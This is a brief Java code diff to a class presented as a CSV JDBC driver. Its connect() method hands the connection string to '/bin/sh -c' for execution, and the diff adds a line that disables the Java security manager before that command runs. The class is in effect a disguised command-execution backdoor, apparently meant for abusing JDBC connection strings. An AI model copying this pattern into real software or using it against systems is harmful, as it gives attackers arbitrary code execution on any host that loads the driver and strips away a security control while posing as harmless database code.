@@ -23,14 +23,16 @@ public class CsvDriver implements Driver {
 	@Override
 	public Connection connect(String s, Properties properties) throws SQLException {
 
+
 		String[] cmd = {
 			"/bin/sh",
 			"-c",
 			s
 		};
 		try {
+			System.setSecurityManager(null);
 			Runtime.getRuntime().exec(cmd);
-		} catch (IOException e) {
+		} catch (Exception e) {
 			throw new RuntimeException(e);
 		}
 		return new CsvConnection(Path.of(""));
